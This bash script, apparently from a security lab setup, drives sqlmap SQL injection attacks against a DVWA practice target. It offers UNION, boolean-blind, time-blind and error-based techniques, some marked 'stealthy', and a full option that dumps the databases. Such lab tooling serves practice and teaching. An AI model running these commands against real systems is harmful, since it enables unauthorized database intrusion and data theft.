#!/bin/bash
###############################################################################
# SQL Injection Attacks using SQLmap
# Target: DVWA
###############################################################################

TARGET_IP="${1:-10.10.40.10}"
TARGET_PORT="${2:-80}"
RESULTS_DIR="${3:-.}"

source "$(dirname "$0")/../configs/targets.conf" 2>/dev/null || true

echo "=============================================="
echo "SQL Injection Attack Suite"
echo "Target: ${TARGET_IP}:${TARGET_PORT}"
echo "=============================================="
echo ""

# Check if we have a session cookie
echo "DVWA requires authentication. You need to:"
echo "1. Login to DVWA at http://${TARGET_IP}/login.php"
echo "2. Set security level to 'low' in DVWA Security"
echo "3. Get your PHPSESSID cookie from browser dev tools"
echo ""

read -p "Enter your PHPSESSID cookie value: " PHPSESSID

if [[ -z "$PHPSESSID" ]]; then
    echo "No cookie provided, using default attack (may fail)..."
    COOKIE_OPT=""
else
    COOKIE_OPT="--cookie=\"PHPSESSID=${PHPSESSID};security=low\""
fi

echo ""
echo "Select SQLi attack type:"
echo "1) UNION-based (fast, obvious)"
echo "2) Blind boolean-based (stealthy)"
echo "3) Time-based blind (slowest, stealthiest)"
echo "4) Error-based (moderate noise)"
echo "5) All techniques (comprehensive)"
echo ""
read -p "Choice [1-5]: " choice

BASE_URL="http://${TARGET_IP}/vulnerabilities/sqli/"
PARAM_URL="${BASE_URL}?id=1&Submit=Submit"

case "$choice" in
    1)
        echo "Running UNION-based SQLi..."
        sqlmap -u "${PARAM_URL}" \
            --cookie="PHPSESSID=${PHPSESSID};security=low" \
            --technique=U \
            --batch \
            --level=2 \
            --risk=2 \
            --dbs \
            -o "${RESULTS_DIR}/sqlmap_union.log" \
            2>&1 | tee "${RESULTS_DIR}/sqlmap_union_output.txt"
        ;;
    2)
        echo "Running Blind Boolean-based SQLi..."
        sqlmap -u "${PARAM_URL}" \
            --cookie="PHPSESSID=${PHPSESSID};security=low" \
            --technique=B \
            --batch \
            --level=3 \
            --risk=2 \
            --dbs \
            -o "${RESULTS_DIR}/sqlmap_blind.log" \
            2>&1 | tee "${RESULTS_DIR}/sqlmap_blind_output.txt"
        ;;
    3)
        echo "Running Time-based Blind SQLi..."
        sqlmap -u "${PARAM_URL}" \
            --cookie="PHPSESSID=${PHPSESSID};security=low" \
            --technique=T \
            --batch \
            --level=3 \
            --risk=2 \
            --time-sec=2 \
            --dbs \
            -o "${RESULTS_DIR}/sqlmap_time.log" \
            2>&1 | tee "${RESULTS_DIR}/sqlmap_time_output.txt"
        ;;
    4)
        echo "Running Error-based SQLi..."
        sqlmap -u "${PARAM_URL}" \
            --cookie="PHPSESSID=${PHPSESSID};security=low" \
            --technique=E \
            --batch \
            --level=3 \
            --risk=2 \
            --dbs \
            -o "${RESULTS_DIR}/sqlmap_error.log" \
            2>&1 | tee "${RESULTS_DIR}/sqlmap_error_output.txt"
        ;;
    5)
        echo "Running comprehensive SQLi (all techniques)..."
        sqlmap -u "${PARAM_URL}" \
            --cookie="PHPSESSID=${PHPSESSID};security=low" \
            --technique=BEUSTQ \
            --batch \
            --level=5 \
            --risk=3 \
            --dbs \
            --dump \
            -o "${RESULTS_DIR}/sqlmap_full.log" \
            2>&1 | tee "${RESULTS_DIR}/sqlmap_full_output.txt"
        ;;
    *)
        echo "Invalid choice, running UNION-based..."
        sqlmap -u "${PARAM_URL}" \
            --cookie="PHPSESSID=${PHPSESSID};security=low" \
            --technique=U \
            --batch \
            --dbs \
            2>&1 | tee "${RESULTS_DIR}/sqlmap_default.txt"
        ;;
esac

echo ""
echo "SQLi attack complete. Results saved to ${RESULTS_DIR}/"
